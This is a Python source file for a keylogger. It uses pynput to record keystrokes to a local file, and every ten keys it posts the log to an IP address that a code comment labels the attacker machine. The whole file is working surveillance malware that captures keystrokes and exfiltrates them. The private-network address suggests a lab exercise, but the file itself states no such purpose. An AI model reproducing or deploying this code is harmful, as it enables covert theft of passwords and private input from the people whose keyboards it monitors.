import requests
from pynput.keyboard import Key, Listener
import os

counter = 0

# get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))
log_path = os.path.join(script_dir, "keylog.txt")

# sends key log to attacker machine
def send_log():
    url = "http://172.16.23.132:8000"
    files = {'file': open(log_path, 'rb')}
    try:
        requests.post(url, files=files)
    except Exception as e:
        print("Failed to send log:", e)

# captures keystrokes
def on_press(key):

    global counter
    counter += 1
    write_file(key)

    if counter >= 10:
        send_log()
        counter = 0

# writes keystrokes to file
def write_file(key):
    with open(log_path, 'a') as file:
        k = str(key).replace("'","")
        if k.find("space") > 0:
            file.write(" ")
        elif k.find("Key") == -1:
            file.write(k)

# ends capture
def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    open(log_path, 'w').close()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    send_log()